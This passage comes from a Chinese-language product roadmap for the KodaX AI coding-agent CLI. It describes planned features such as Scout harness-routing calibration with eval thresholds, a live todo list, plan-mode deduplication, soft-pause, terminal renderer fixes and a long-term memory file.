- `FEATURE_106` (v0.7.31) 是 v0.7.30 实战观察驱动的 **AMA Harness Selection Calibration**。**根因**：6 因子叠加—— (1) 路由启发式默认 `H0_DIRECT`（FEATURE_061 设计意图保留）/ (2) Scout tool policy `undefined` = write/edit/multi_edit/bash 全套放行 / (3) Scout role-prompt 称 `H0 (default)` + emit "optional"（v0.7.26 c4f4514 引入，需收紧）/ (4) **scope reflection 在 AMA 路径完全失效**（v0.7.26 FEATURE_084 把 AMA 从 `runDirectKodaX → runKodaX` 迁到 `Runner.run → genericRun`，后者不调 substrate `applyPostToolProcessing`，bug latent 自 v0.7.26）/ (5) **reflection 文本引用 stale tool name `emit_managed_protocol`**（v0.7.22 旧名，AMA 实际 emit 工具是 `emit_scout_verdict`）/ (6) v0.7.29 FEATURE_103 Scout reasoning `quick→balanced` 让 Scout 更自信。**三 slice 修复**：(1) Slice 1 — scope reflection 升级为 ToolGuardrail（与 v0.7.37 anti-escape 同源范式，挂 scoutSpec/generatorSpec.guardrails，afterTool 拦截，文案修正为 emit_scout_verdict 并对齐 protocol-emitters payload shape）；(2) Slice 2 — Scout role-prompt 重写（去掉 H0 (default) 措辞、量化 H0 边界 ≤1 file ≤30 lines、SCOPE COMMITMENT 从主观 self-check 升级为 hard rule "≥2 files OR 从零搭项目必须先 emit_scout_verdict"）；(3) Slice 3 — `harnessSelectionTiming` 注册为 FEATURE_101 第 8 项 Quality Invariant（observe-only severity=`warn`，记录而不阻断）。**Eval 流程不依赖线上反馈**：所有 prompt 改动 + reasoning 档位决策跨 FEATURE_104 alias 表 8 个 coding-plan provider/model（`zhipu/glm51` / `kimi` / `mimo/v25` / `mimo/v25pro` / `mmx/m27` / `ark/glm51` / `ds/v4pro` / `ds/v4flash`，跨 5 个独立 provider 家族）跑 `benchmark/harness/`，Stage 1（48 cases）验证 8 alias 上不退化，Stage 2（108 cases）跨 prompt × reasoning 矩阵验证 `multi_file_h0_rate` ≤5% 并给 FEATURE_103 reasoning 决断提供量化支撑。**Acceptance 量化阈值锁住**：multi_file_h0_rate ≤5% / pre_emit_commitment_rate ≥70% / harness_correctness 在 8 alias mean ≥80% std ≤8% / task_quality 不退化超 -2 noise band。**显式不做**：P0 hotfix 单独发 patch（取消，全部合 v0.7.31 修完整）；改 H0_DIRECT 路由启发式；改 Scout tool policy（H0 内仍需 write/edit）；动 admission scope（FEATURE_101 自管 7 项 closed set，106 注册第 8 项是外部消费者用法）；引入用户层新 mode（SA/AMA 稳定，ADR-003）。**依赖**：硬依赖 FEATURE_085 (ToolGuardrail runtime, v0.7.26) + FEATURE_101 (invariant runtime, v0.7.31 同版本) + FEATURE_104 (prompt eval harness, v0.7.29)；与 FEATURE_094 (v0.7.37 anti-escape) 同源范式协同。详见 [v0.7.31 FEATURE_106 设计](features/v0.7.31.md#feature_106-ama-harness-selection-calibration)。
- **整体时序锁定（Plan B + 092 + 100 + 106 + 109）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → **v0.7.29 (100 + 078 + 103 + 104, SA Runner Frame Adoption + Role-Aware Reasoning Profiles + Scout Calibration & L5 Followup Escalate + Prompt-Eval Harness Module)** → **v0.7.30 (existing 057+060)** → **v0.7.31 (101+089+106, Admission Contract + Agent Generation + AMA Harness Selection Calibration)** → v0.7.32 (090) → v0.7.33 (092) → ... → v0.7.45 (102) → v0.7.46 (105) → v0.7.47 (108) → **v0.7.48 (109, Harness Observability Substrate — Long-Term Memory + Prediction Contract + Cross-Family Prose Guard)**。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；**100 需 084+085 到位（hard）；078 / 089 / 090 / 092 / 094 / 106 都需 100 到位（hard）—— Agent declaration 上的 reasoning slot、Runner 级 guardrail 注册栈、`Runner.run(constructedAgent, ...)` 调用链、manifest hot-swap 的 Runner lifecycle 边界，全部依赖 SA 路径已进入 Runner 帧**；**092 / 106 需 085 到位**（106 Slice 1 的 ToolGuardrail 直接挂在 Scout/Generator agent declaration 上）；**106 需 101 到位**（Slice 3 的 `harnessSelectionTiming` invariant 注册到 101 的 invariant runtime）；**106 需 104 到位**（Eval Plan 跨 FEATURE_104 alias 表 8 个 coding-plan provider/model 强制走 `benchmark/harness/`）。0.8.0 之后不规划。
- `FEATURE_097` 是 v0.7.34 的独立 UX 增强：在 AMA spinner 下方新增 Claude Code 风格的实时计划列表（TodoListSurface 组件），用可视化的 pending / in_progress / completed / failed / skipped 状态展示 Scout 在入口阶段生成的 `executionObligations[]`。**决策点**：**不**按 H0/H1/H2 复杂度硬编码折叠显示；参照 Claude Code 做法，由 Scout 自主决定是否产出 obligations —— 1 条或 0 条时直接不渲染（简单任务自然不干扰），2+ 条统一展开。所有 obligations 完成后 5 秒延迟隐藏。数据流复刻 FEATURE_086 (`onRepoIntelligenceTrace`) 管线：**单路** `KodaXEvents.onTodoUpdate` 回调（不做 `KodaXManagedTaskStatusEvent.todoItems` 双轨兜底——单进程 CLI 不存在订阅遗漏的真实场景，FEATURE_086 单路至今未见问题是先例，按 KodaX 极简哲学砍掉）+ 新增 `TodoUpdate` 工具（Scout 在 H0_DIRECT 继续执行时 / Generator / Planner 都可主动推进状态）+ Evaluator verdict 自动收尾（revise → in_progress 项标 failed → 下轮 reset pending；不动 Evaluator 协议，§5 决策细节 ①）。**Schema 简化（2026-05-03）**：drop Claude Code 的 `content/activeForm` 双形式，只保留 `content` 单字段直接复用 Scout 既有 `executionObligations: string[]`，零 prompt eval 触发对协议的双形式产出要求。**H0 时机修复（GLM external review 2026-05-03 提出）**：原稿"Scout 不注入 todo_update"是 H0 时机 bug——H0 时 Scout = executor 继续干活，不注入会导致 H0 全程没 todo 推进；修复为 Scout 工具集注入 todo_update + role-prompt 限定"仅 emit_scout_verdict 之后、作为 H0_DIRECT executor 时调用"。**H0 Mini-Planner 强度 release gate（已完成 2026-05-04）**：64 cells pilot（4 case × 2 variant × 8 alias × 1 run）实测 Heavy 全面占优——multistep_completeness 双双触顶 100% → 回退次要信号；obligation_coherence 81%→95.5% (+14.5pp 跨 5 家族同向消除"Read X" filler 步骤)，simple_overformalization 8.3%→0% (Heavy 反而更不会让简单任务过度形式化)，harness_correct 91.3%→95.7% (+4.3pp)。**Ship Heavy** 写入 Scout role-prompt（≥2 distinct steps → 列 obligations + 正反例 + emit 时机 + todo_update 推进）；详见 `benchmark/results/feature-097--pilot-1run--ANALYSIS.md`。**LLM 行为兜底**：3 层兜底简化为 2 层（v0.7.30 设计稿初版列了 Layer 3 启发式 in_progress 推断，2026-05-03 砍掉——经查 Claude Code 也没做，他们只有 `TURNS_SINCE_WRITE=10` reminder；KodaX 同等设计 `TURNS_SINCE_TODO_UPDATE_REMINDER=8`）。**依赖**：FEATURE_084 (v0.7.26) 重写完成后的 Scout executionObligations 契约稳定形态；FEATURE_086 (v0.7.27) 前缀清理后的干净命名（避免在工具/类型重命名期间双轨维护）；**FEATURE_110 (v0.7.34 同版本前置)** 砍掉路径 1 老 plan-mode，否则 Phase 4+ "Plan Mode 联动" 延伸要双写两条路径。**不做**：fs 持久化 / 依赖图 / 跨进程 swarm 共享（Claude Code V2 级别的重型基础设施，KodaX 单进程不需要）/ session-scoped resume todo 列表（task-scoped 即可，§5 决策细节 ④）/ JSON / CLI 对外 surface（推迟到 v0.8.2 FEATURE_113）/ Evaluator 协议加 failed_obligation_ids 字段（不映射，§5 决策细节 ①）。
- `FEATURE_110` (v0.7.34) 是 plan-mode 实现层的去重：KodaX 当前同时存在两套 plan-mode 实现且会真实打架——路径 1（`/plan` slash 命令 + `runWithPlanMode` + readline/chalk + `plan-storage` 持久化，v0.3.1 时代）已被 FEATURE_074 v0.7.20 引入的路径 2（`PermissionMode="plan"` + `exit_plan_mode` tool + Ink-native PlanScrollPanel 审批 UI）完全替代但从未删除。**真实打架场景**：用户先 `/plan on`（路径 1 `planMode=true`）又把 `PermissionMode` 切到 `"plan"`（路径 2），wizard 内调 `runManagedTask` 没显式覆盖 `permissionMode` → 继承 `"plan"` → 写工具被 `planModeBlockCheck` 阻断 → wizard 自己的 `confirm("Execute this step?")` 已 y 通过却得到 `[Tool Error]`。**死代码铁证**：路径 2 持续投入（FEATURE_074/075/097 phase 4），路径 1 上次实质改动是 v0.6 时代小修，KNOWN_ISSUES 记录"plan-mode 路径不接 pendingInputs"两个版本未修，README first-class tool 表只有 `exit_plan_mode`，路径 1 `~/.kodax/plans/*.json` 持久化跟主线 lineage / permission gate 都没接。**改动表面**：删 `packages/repl/src/common/plan-mode.ts` (281 行) + `packages/repl/src/common/plan-storage.ts` (77 行)；清理 5 处引用——`src/index.ts:54-60` re-export（public API 泄漏，README 未 document，CHANGELOG 标 breaking note）/ `packages/repl/src/index.ts:81-90` re-export / `packages/repl/src/interactive/commands.ts:50,1549-1640` (整个 /plan 命令块) / `packages/repl/src/ui/InkREPL.tsx:136,1348,6097-6099,6197,6670-6672,6839,6850,7055` (`planMode` useState + 3 处 if 分支 + setPlanMode callback) / `packages/repl/src/interactive/repl.ts:69,1083,1167,1299` (readline-based REPL 仍是 active 入口，不能整文件砍只清 plan-mode 引用)。**不做**：自动迁移 `~/.kodax/plans/*.json`（CHANGELOG 一句话提示用户手动 `rm -rf` 即可，为死功能写迁移代码是反向投入）/ `/plan` slash 命令转生为路径 2 UX shortcut（用户已确认不留这个名字，YAGNI）/ 砍 `repl.ts` 整文件（仍是 active 入口）/ 改 FEATURE_074 路径 2 任何行为。**总计 ~ -460 ~ -500 行净删除，0 行新增**。**前置 FEATURE_097**：v0.7.34 内 FEATURE_110 先 land，FEATURE_097 后 land；这样 FEATURE_097 phase 4 的"Plan Mode 联动"延伸语义清晰单一仅指路径 2。
- `FEATURE_111` (v0.7.43, originally v0.7.35 → v0.7.37 → v0.7.38 → v0.7.43 — first shift because v0.7.35 became a hotfix-only release for FEATURE_092 / FEATURE_097 P0 issues; second shift on 2026-05-04 deferred FEATURE_094 from v0.7.36 to v0.7.37 and FEATURE_111 from v0.7.37 to v0.7.38, leaving v0.7.36 free; third shift on 2026-05-04 further deferred FEATURE_094 to v0.7.42 and FEATURE_111 to v0.7.43, leaving v0.7.36-v0.7.41 free) 是 runner-level **soft-pause protocol**：填补现有 `abort`（丢整个 turn 上下文，Planner 已花的 2000-6000 token 浪费）与 `pending-inputs`（`MAX_PENDING_INPUTS=5`，要等当前 LLM turn 自然结束才注入，长 tool 跑 90s+ 时延迟到爽）之间的 UX 缺口。**真实痛点**：用户在 H2 跑 `npm test` 90 秒中途想加一句"测试要包含 token rotation 场景"，当前两个选择都不好——abort 把 Planner token 全废，pending-inputs 要等 5+ 分钟才生效。**设计**：runner loop 加单 `paused: boolean` 局部变量（**不**引入 `PauseToken` 新类型 / **不**引入三状态机 `running\|paused\|aborting`，一个 boolean 够），在每次 tool call 完成后、下一轮 LLM 调用之前调 `maybeWaitResume()` helper 检查一次（**不**在 tool 执行**中**检查保持 tool 原子性，长 bash/test 让它跑完）；新增 `KodaXEvents.waitForUserResume?(): Promise<string>` 让 UI 喂回 resume signal。**UI**：单击 ESC = soft-pause（spinner 文字变 `Paused (waiting for tool to finish)` → tool 完成后变 `Paused — type to inject, Enter to resume`），输入任意内容+Enter = resume + 注入下一轮 user message（前置 `<user-interjected mid-task>` 标签 + system reminder 让 LLM 知道是"插话"不是"新任务"），空 Enter = resume 不注入（统一"任意 Enter 都算 resume"，砍掉"空 Enter vs 输入 Enter"双语义—— LLM 能理解空消息 / continue 隐式语义，工程层硬编码两种 Enter 是把不必要复杂度暴露给用户），paused 状态再按 ESC = 升级为 abort（既有 double-ESC 路径不变）。**Prompt eval 硬性触发**：本 feature 触及 system prompt + role prompt（`<user-interjected mid-task>` 标签解读），按 FEATURE_104 规则必须新增 `tests/soft-pause-interject.eval.ts` 在 8 alias mean ≥80% 通过率（与 FEATURE_106 同一阈值）。**业界对齐**：Claude Code `messageQueueManager` "迭代边界热注入" + `QueryEngine.interrupt()` AbortController 双轨；OpenCode Effect fiber `Effect.onInterrupt` tool 完成前不强行打断；**反例 Warp** `CancellationReason::FollowUpSubmitted` 每次 follow-up = abort + restart 极端版 KodaX 不采用。**与 FEATURE_097 / 110 关系**：与 097 正交（soft-pause 触发后 TodoListSurface 不变 / spinner 文字变更但 todo 列表保持原状 / resume 后正常推进）；与 110 正交（FEATURE_110 砍老 plan-mode 让 plan-mode 简化到只有路径 2 一条，soft-pause 不与 plan-mode 交互——`PermissionMode="plan"` 下用户照样 ESC soft-pause 注入意见调整正在生成的 plan，符合 FEATURE_074 live predicate closure 语义）。**不做**：在 tool 执行**中**检查 paused（破坏 tool 原子性）/ 替代 pending-inputs（两者并存正交不冲突）/ 改 child agent abort/pause 协议 / 持久化 paused 状态 / 给 paused 状态加超时（用户离开终端时不应被自动取消）。**总代码量 ~100 行**（runner-driven.ts ~80 + InkREPL.tsx ~20 + 1 个 eval file + 单测）。详见 [v0.7.43 设计稿](features/v0.7.43.md#feature_111-runner-level-soft-pause-protocol)。
- `FEATURE_112` (v0.7.34) 是 **Investigation-Scale-Aware Routing — Read-Scope Fix**：修复 Scout 路由对 read-only 重度调研任务的系统性失明。**用户痛点**：实战反馈 KodaX 在"为什么 X 这么设计 / 解释整条数据流 / 跨模块审查"类任务上 Scout 永远 H0 单飞，从来不升 H1（让 Evaluator audit）也从来不派 child（早期分流），即使读 8+ 文件 / 跑 15+ 工具调用。**三轮独立调研 + 对抗评审定位的四点根因**：(1) `deriveTopologyCeiling` 只看 mutationSurface + assuranceIntent 不看 complexity，read-only 复杂任务天花板被锁死 H0；(2) `fanoutReason` 对 `primaryTask=unknown` 硬写 "No high-value shard class detected"，对 LLM 是负面 dispatch 信号；(3) Scout role-prompt 的 SCOPE COMMITMENT 只覆盖 mutation scope，无对称的 investigation-scope 触发条件；(4) `topologyCeiling: H1_EXECUTE_EVAL` 在 decisionSummary 是裸值，Scout 不知道 H1 意味着 "Evaluator audit"。**4 Slice 修复（对称 FEATURE_106 prompt-only 路径）**：Slice 1 — `deriveTopologyCeiling` 加 complexity 维度（read-only + complex/systemic → H1 ceiling，仅放宽天花板，Scout 仍持升级权 FEATURE_061）；Slice 2 — `fanoutReason` 对 unknown 任务改中性文案 "Task scope is unclassified; dispatch_child_task remains available if investigation threads emerge"（不动 admissibility 不动白名单）；Slice 3 — SCOPE COMMITMENT 加 investigation-scope rule（≥5 文件 OR ≥8 搜索 → emit H1）+ multi-thread early-decision rule（前 1-2 轮 ≥2 独立线程 → 早派 child），与 FEATURE_106 mutation rule 完全对称；Slice 4 — decisionSummary 给 H1/H2 ceiling 加 conditional 语义说明（"Evaluator can audit your conclusion if you escalate to H1"），闭合 Slice 1 的死锁。**Eval（单步 quantitative，对称 ama-harness-selection）**：4 case × 2 variant × 3 alias = 12 cells；`benchmark/datasets/read-scope-routing/`（4 case：shallow-qa 回归保护 / deep-systemic / multithread / unknown-heavy）+ 13 hermetic dataset shape 测试 + Layer 1 deterministic 9 单测覆盖 deriveTopologyCeiling 全 (mutationSurface × complexity × assurance) 矩阵。**Pass 阈值**（post-pilot 提升）：feature_112 在 shallow-qa ≥ 95% H0 不退化；三个 deep class `read_scope_h1_rate` ≥ baseline + 30pp（alias mean）；FEATURE_106 mutation 数据集 multi_file_h0_rate 保持 0%。**显式不做**：runtime investigation guardrail（child-executor guardrail 转发耦合 + 触发时机错误 + compaction 摘要被 hint 稀释 + tool_result rewrite session 重放风险）/ 改 `resolveAmaFanoutClass` 白名单加 qa/unknown（qa 设计为轻量路径不该开 fan-out；unknown 杂合类无差别开会 false-positive 派 child）/ 改 `isAmaFanoutClassActive` ambiguous gate（review/bugfix 在 ambiguous family 下意外解锁 fan-out 风险）/ 给 unknown 一个 fanoutClass=evidence-scan（evidence-scan 文案 "bounded evidence gathering before diagnosis" 与 unknown clarify-first 指示矛盾）/ 改 FEATURE_106 mutation rule 措辞。**与 FEATURE_097 / 110 完全正交可并行 land**（仅动 reasoning.ts + role-prompt.ts decisionSummary 文本，不与 plan-mode / todo list 交互）。**总改动**：~21 LoC 代码 + ~80 LoC eval dataset + ~140 LoC 单测，零跨包、零新基础设施、零 child-executor 改动。详见 [v0.7.34 FEATURE_112 设计](features/v0.7.34.md#feature_112-investigation-scale-aware-routing--read-scope-fix)。
- `FEATURE_096` **Migrated from v0.7.39 → v0.7.30 (2026-04-28)**：Windows-SSH ConPTY 自动降级到 main-screen policy。原计划 `v0.7.39` 单独成版本，2026-04-28 提前迁入 `v0.7.30` 与 `FEATURE_057` 同版交付。**迁入理由**：(1) 改动唯一核心文件 `packages/repl/src/tui/runtime.ts` 与 057 Track A/B 完全重合，自然内聚；(2) 设计稿自陈是 057 fullscreen 主线的"降级逃生门"，与 v0.7.30.md 第 558 行允许的 "burn-in compatibility flag as escape hatch" 同一位面；(3) 057 让 fullscreen 成为 capable host 默认路径——单独留 096 在 v0.7.39 会让 Windows-SSH 用户在 057 落地后到 v0.7.39 之间长期断档（9 个 minor 版本）；(4) 体量小风险低：5 个文件（runtime.ts + 4 个 test 文件），全部是"加分支 + 加 host profile 字面量"而非"改既有逻辑"。**改动表面**：新增 `remote_conpty_host` host profile 联合分支 + 对应 `FullscreenPolicy` 字面量 + `KODAX_FULLSCREEN={1|0|未设}` 三态用户级逃生开关（围绕 fullscreen 决策命名；`=1` 在 detect 阶段让 `isRemoteConptyHost` 不分流 / `=0` 在 policy 阶段强制 main-screen 联动关 mouse + 保留 streaming/spinner；两个 override 各自在不同层处理互不干扰）；不改 `AlternateScreen` 组件、`InkREPL` 的 `useKeypress` 管线、`resolveTranscriptPointerAction` 路由、`AlternateScreen` 的 alt-screen enter/exit 序列拼装（仅由 mouseTracking flag 自然消化）。**显式不做**：X10 mouse 解析 / DECSET 1007 alternate-scroll / 客户端终端指纹识别 / 替代 057。原 `docs/features/v0.7.39.md` 已并入 `v0.7.30.md`，git history 保留全部修订。
- **FEATURE_057 Track F (v0.7.30 必交付，不 defer)**：cell-level diff renderer 升级——把 `tui/substrate/ink/log-update.js` (241 行) + `tui/core/internals/log-update.js` (310 行) 从 `createStandard` / `createIncremental` 字符串级 full-frame 重写改为 cell-level diff，对标 Claude Code `src/ink/log-update.ts`。**为什么必交付不 defer**：(1) 057 整体目标是 "renderer 完整切换到对标 Claude Code 一套"，组件层已 vendor 自 npm `ink`，但渲染机制层仍是 `log-update` 字符串级——这是 npm `ink + log-update` 的方式，不是 Claude Code 的方式；defer Track F = 057 ship 半成品。(2) FEATURE_096 Windows-SSH 用户在 main-screen 路径下，每次 spinner/streaming 重写都会触发"擦掉再写"，字符串级 renderer 在 main-screen 下会让旧 UI 帧进 scrollback history 留 ghost frames——FEATURE_096 直接受影响。(3) Track E (output ownership purify) 解决"何时 replay"，Track F 解决"重写本身只发差异不 replay 全帧"，两者配套；缺 Track F 单做 Track E 仍解决不了重写残影。**完成判据**：log-update 输出从 "eraseLines(prev) + 全帧字符串" 改为 "cell-by-cell diff + 绝对坐标光标"；典型 1 字符变化的输出字节数从 2-4 KB 降到 < 100 字节；spinner 动画 / streaming 文本流不在主屏 scrollback 留旧帧痕迹。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。
- `FEATURE_109` (v0.7.48) 是读 [arxiv:2604.25850](https://arxiv.org/abs/2604.25850) (Agentic Harness Engineering, AHE) 后给 KodaX 整体做产品级校准的最小必要补强。**论文核心实证**：同一个 GPT-5.4，opencode 47.2% → Codex CLI 71.9% → AHE 77.0%（30pp harness gap，比换 model 还大）；component ablation 显示 long-term memory 单独 +5.6pp（最大单贡献，Hard 任务上 memory-only 63.3% 超过 full AHE 53.3%）；**system prompt 单独 -2.3pp**（prose 不 transfer，structure transfer）；fix precision 33.7%（5×random）vs regression precision 11.8%（2×random，self-attribution 对 regression 基本盲）。**对 KodaX 整体的判断**：(1) KodaX 7 类首类组件里只有 long-term memory 系统性缺失（grep `long.?term.?memory|cross.?session.?memory|persistent.?memory` 全仓 0 命中），FEATURE_108 reflective patcher 想消费的"沉淀型经验"恰好就是这一层；(2) FEATURE_090 audit log 是 passive ledger，论文 Decision observability 的 falsifiable contract 概念可以零新字段实现（在 `llmSummary` 自然语言里写 prediction，下次 self-modify 时 LLM 自己回看是否兑现）；(3) KodaX 12 provider 是真实 cross-family pool，论文证 cross-family transfer +5-10pp 的硬约束是 **prose 不能按 provider 分叉**，需要一个机械单测守住。**三 slice**：Slice A1 long-term memory 是 `<cwd>/.kodax/agent-memory.md` 一个 markdown 文件 + 三个最小函数 + 复用 FEATURE_090 ask-user 通路（不抽象 Repository / Manager / vector store / retrieval）；Slice A2 prediction contract 仅改 self-modify diff summary prompt 让 LLM 在 `llmSummary` 自然语言里写 "Predicted impact"，下次同 agent self-modify 时 inject 上一条 audit entry 让 LLM 自己写 "Verification of previous prediction"（零新 typed 字段、零 falsifiability check 函数、零 history reader 抽象）；Slice B2 cross-family prose guard 是 1 个单测断言 4 个 prompt 文件家族（system-prompt / role-prompt / protocol-emitters / coding-preset DEFAULT_INSTRUCTIONS）的常量字符串不出现 12 provider 的名字。**经过两轮自我审视和两个对立子 agent 辩论（极简哲学捍卫者 + 产品长期价值评估者）**，从最初列的 14 条压缩到 3 条工程任务 + 1 个 sanity check + 2 条 CLAUDE.md 原则。**显式不做**：cross-step risk pattern registry（现有 13 个 middleware hardcode 已 work，抽 registry 是为零次发生场景设计）/ rollback CLI（git revert + 删 `.kodax/constructed/agents/<name>/<v>/` 已够）/ tool description outcome-driven 优化机制（正确路径是 §A1+§A2 落地后让 KodaX agent 用现有 trace + memory 自己提 description PR 候选 emergent 而非工程化）/ self-modify 扩到 tool description（governance scope 极大扩展，至少需要 3+ 真实需求驱动）/ declarative middleware（agent 写 middleware 代码超出当前 governance 边界）/ fix-regression metric panel（工程化 metric 在 single-user CLI 场景意义不明，用 LLM-as-judge prompt disclaimer + CLAUDE.md 原则 2 兜底）。**与 FEATURE_108 sequencing**：FEATURE_108 (v0.7.47) 先 ship 时无 memory 可读 = reflector 只读 trace；v0.7.48 ship 后 FEATURE_108 下一次迭代消费 `.kodax/agent-memory.md` 避免对已知 boundary case 重复提候选 patch（FEATURE_108 设计稿在本 feature 实施时同步更新一段说明此消费关系）。**总代码量 < 500 行，无新 package、无新依赖、无新抽象层**。**CLAUDE.md 同步更新**两条原则：(1) Provider 分支位置 — provider-specific 分支只能在 LLM-call boundary（max_tokens / reasoning_effort / wire-level），不能延伸到 prompt prose；(2) LLM 自我评估的不可逆操作边界 — review verdict / self-modify diff summary / judges middleware / advisor verification 不能直接驱动 git commit / push / 文件删除 / 部署等不可逆操作，必须经过 user approve 或正交 control case 兜底。详见 [v0.7.48 FEATURE_109 设计](features/v0.7.48.md#feature_109-harness-observability-substrate--long-term-memory--prediction-contract--cross-family-prose-guard)。
- `FEATURE_113` (v0.7.48 之后规划，**v0.8.2** placeholder) 是 FEATURE_097 的对外 surface 延伸：FEATURE_097 (v0.7.34) 在 KodaX 内部维护一份完整 TodoList in-memory store + `KodaXEvents.onTodoUpdate` 单路事件，但**该数据从未对外暴露**——`--json` mode 只输 final answer + transcript，没有独立 CLI 命令 query 当前 todo 状态，上游 agent / IDE 扩展 / CI wrapper 无法消费 KodaX 的进度信号。本 feature 把同一份数据接到 JSON / CLI 两个对外 surface：(1) `--json` 输出流加 `{"type":"todo_update","items":[...]}` event type，每次 onTodoUpdate 触发输出一行 JSON；(2) `kodax todos [--watch] [--session ID]` CLI 命令查询当前 todo 状态。**用户 2026-05-03 确认 v0.7.34 暂时不加对外 surface，但记入未来 feature**。**显式前置**：FEATURE_097 必须先 ship + 至少 1-2 个 minor 版本的真实使用数据验证 todo 数据形态稳定。**显式不做**：自动激活（FEATURE_097 落地不会自动启用 JSON / CLI surface，是显式选择项）/ 复刻 Claude Code V2 swarm IPC（单进程 CLI 不需要 fs.watch + lockfile）/ 在 v0.7.34 ship 前预留 placeholder API（YAGNI）。详见 [v0.8.2 FEATURE_113 设计](features/v0.8.2.md#feature_113-todolist-json--cli-surface)。
- `FEATURE_095` **Absorbed into FEATURE_057（v0.7.30）Track F**：原计划 v0.7.39 单独成版本的"ink substrate cell-level diff 渲染管线重写"。实地核对 057 现状发现 `packages/repl/src/tui/core/` 已经落了 `screen.ts`（transcript-row 级 `TranscriptScreenBuffer`，非 cell 级）/ `selection.ts` / `hit-test.ts` / `termio.ts`（alt-screen + mouse-tracking）/ `scroll.ts` / `renderer.ts` / `engine.js` 等模块；057 设计稿 §10 renderer-native selection（要求"screen-buffer coordinates + hit-testing against rendered DOM rectangles"）、§11 ScrollBox parity（要求"viewport culling tied to renderer's layout pass"）都依赖 cell-level buffer，而该 buffer 是 095 设计稿的核心产物。两者不是兄弟，而是同一个重构故事的上下层。**合并后的 057 Track F**：在 `packages/repl/src/tui/substrate/ink/` 下引入 `cell-screen.ts`（避免与 `tui/core/screen.ts` 的 `TranscriptScreenBuffer` 撞名）、`frame.ts`、`csi.ts`、`osc.ts`；把 `substrate/ink/log-update.js` 与 `core/internals/log-update.js` 从 `createStandard / createIncremental` 字符串级重写成 `LogUpdate.render(prevFrame, nextFrame)` 类，统一走 cell-level diff + 绝对坐标光标。**SSH 闪烁根因更新**：原设计稿假设根因是 full-redraw 模式本身；实地用 `KODAX_TEE_STDOUT` 诊断后确认**真实根因是 `engine.js` altScreen 分支内 `this.log.clear() + this.log(fullFrameOutput)` 两次独立 stdout.write 拆帧**——中间 1~2ms ConPTY 把"屏幕清空"中间态 flush 给客户端就闪。该点已通过合并为单次 `this.log.clearAndRender(fullFrameOutput)` 的 10 行补丁消除（log-update 内部 eraseLines + content 以单次原子 write 发出），不再需要等 Track F 才能恢复 SSH 可用性。Track F 的剩余动机（TextInput 光标漂移根治、每帧字节量降至差异级、为 057 §10/§11 提供 cell buffer 基础）仍然成立，但紧迫性从"阻断 SSH 使用"降级为"TUI 质量提升"。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。

---

## 已完成 Feature

> **99 features archived** to [`FEATURES_ARCHIVED.md`](FEATURES_ARCHIVED.md) on 2026-05-19, grouped by release version (`v0.3.1` → `v0.7.41` / `v0.8.0` unreleased). Detailed design docs remain under `docs/features/v{VERSION}.md`.

> `FEATURE_051` close-out posture: keep the current REPL status/footer/task/message surfaces frozen, limit follow-up work to invisible substrate maturity for transcript, scroll/selection, and input behavior, and treat the design doc as a completed close-out record rather than an open rollout plan.

> `FEATURE_055` completed the follow-up REPL hardening work: docs-first substrate maturity, summary-only AMA mapping, and no new visible worker/task shell.

> `FEATURE_031` now treats inline image refs as true structured multimodal inputs: provider-facing text uses stable image anchors such as `[Image #1]` and clean unavailable-image placeholders instead of leaking raw `@image-path` syntax.

> `v0.7.18` 主题：Engineering Shell Maturity（工程外壳成熟度）。基于 KodaX vs Claude Code 全面对比分析，补齐工程外壳层面的真实差距。8 个 Feature 全部完成，1 个取消 (063 Hook — 被 Extension 系统吸收，executor 能力提取为 `api.exec()`/`api.webhook()`)。status bar 成本显示 descoped (064)。

---

## 相关文档入口

- [Feature 设计索引](features/README.md)
- [ADR](ADR.md)
- [HLD](HLD.md)
- [DD](DD.md)
- [PRD](PRD.md)
